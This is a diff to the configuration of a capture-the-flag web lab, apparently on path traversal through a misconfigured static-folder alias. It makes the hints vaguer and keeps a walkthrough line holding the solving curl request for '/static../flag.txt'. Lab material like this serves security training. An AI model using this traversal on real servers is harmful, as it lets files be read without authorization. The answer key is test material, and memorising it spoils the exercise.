@@ -5,18 +5,17 @@ difficulty: medium
 lab_kind: ewpt_109
 est_minutes: 20
 sort: 109
-description: You have permission to investigate this isolated environment. Explore what is available and
-  recover the flag.
+description: |-
+  You have permission to investigate this isolated environment. Explore what is available and recover the flag.
+
+  Scope: target.lab.local:5000
 hints:
 - level: 1
   cost: 0
-  body: Try /static../flag.txt.
+  body: "Compare how the server treats a folder name with and without small changes at its end."
 - level: 2
   cost: 0
-  body: Try URL-encoded variants.
-- level: 3
-  cost: 0
-  body: Compare /static/ and /static.. responses.
+  body: "A small slip in a path mapping can let you step outside the folder it was meant to serve."
 remediation: Avoid an ambiguous alias; use root where possible; normalize paths.
 walkthrough: curl --path-as-is "http://target.lab.local:5000/static../flag.txt" returns the flag.
 dynamic_flag: true
